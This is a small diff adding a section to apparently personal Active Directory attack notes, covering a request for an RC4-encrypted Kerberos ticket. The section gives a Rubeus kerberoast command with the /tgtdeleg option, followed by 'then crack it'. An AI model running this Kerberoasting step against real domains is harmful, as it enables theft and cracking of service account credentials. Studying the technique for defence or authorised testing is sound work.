@@ -115,3 +115,11 @@ Active Directory Attacks:-
 			
 ![image](https://user-images.githubusercontent.com/91881471/174433005-d10ed507-c66c-4760-9eff-4a1c9099ee7e.png)
 
+
+	Requesting RC4 Encrypted Ticket:-
+	
+		As mentioned in the beginning, it's still possible to request an RC4 ecnrypted ticket (if RC4 is not disabled in the environment, which does not seem to be common yet):
+		
+		Steps:-
+			F:\Rubeus\Rubeus.exe kerberoast /tgtdeleg
+			then crack it
